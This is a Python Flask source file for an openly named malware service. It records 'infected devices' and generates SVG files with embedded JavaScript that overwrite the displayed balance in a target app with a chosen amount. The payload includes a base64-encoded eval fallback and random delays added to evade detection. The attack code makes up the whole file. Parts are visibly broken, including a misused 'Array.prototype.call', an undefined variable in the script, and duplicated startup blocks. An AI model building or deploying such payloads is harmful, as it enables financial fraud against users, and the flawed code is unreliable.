from flask import Flask, request, jsonify, render_template
from flask_sqlalchemy import SQLAlchemy
import uuid
import os
import random

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///malware.db'
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

db = SQLAlchemy(app)

class InfectedDevice(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(120), unique=True)
    target_app = db.Column(db.String(120))
    target_amount = db.Column(db.Float)
    timestamp = db.Column(db.DateTime, default=db.func.current_timestamp())

def generate_enhanced_payload(device_id, target_app, target_amount):
    # Multiple DOM selectors for reliability
    selectors = [
        '.balance', '[data-testid="balance"]', '#balance', 
        '.account-balance', '[class*="balance"]'
    ]
    
    # JavaScript payload with multiple techniques
    js_payload = f"""
    // Multiple override techniques
    function overrideBalance() {{
        // Try all selectors
        {";".join([
            f"Array.from(document.querySelectorAll('{sel}')).forEach(el => el.innerText = '{target_amount}');"
            for sel in selectors
        ])}
        
        // Override getter/setter if needed
        Object.defineProperty(document, 'querySelectorAll', {{
            value: function(selector) {{
                const elements = Array.prototype.call(this, selector);
                if (selectors.some(s => selector.includes(s))) {{
                    elements.forEach(el => {{
                        Object.defineProperty(el, 'innerText', {{
                            get: () => '{target_amount}',
                            set: () => {}
                        }});
                    }});
                }}
                return elements;
            }}
        }});
    }}
    
    // Run continuously
    setInterval(overrideBalance, 500);
    
    // Initial attempt on load
    window.addEventListener('load', overrideBalance);
    """
    
    # Wrap in SVG with multiple fallbacks
    return f"""<svg xmlns="http://www.w3.org/2000/svg">
        <script>{js_payload}</script>
        <!-- Fallback using base64 encoding -->
        <rect x="0" y="0" width="1" height="1" 
              onmouseover="eval(atob('ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJhbGFuY2UnKS5pbm5lckhUTUw9JzEwMDAwMDAn'))"/>
    </svg>"""

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    # Create malware entry
    malware = InfectedDevice(device_id=device_id, target_app=target_app, target_amount=target_amount)
    db.session.add(malware)
    db.session.commit()
    
    # Generate enhanced payload
    payload = generate_enhanced_payload(device_id, target_app, target_amount)
    
    # Add random delays to avoid pattern detection
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 500)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'})
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"https://yourdomain.com/uploads/{filename}"})

if __name__ == '__main__':
    db.create_all()
    app.run(debug=True)
    
if __name__ == '__main__':
    db.create_all()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

@app.route('/')
def home():
    return render_template('index.html')
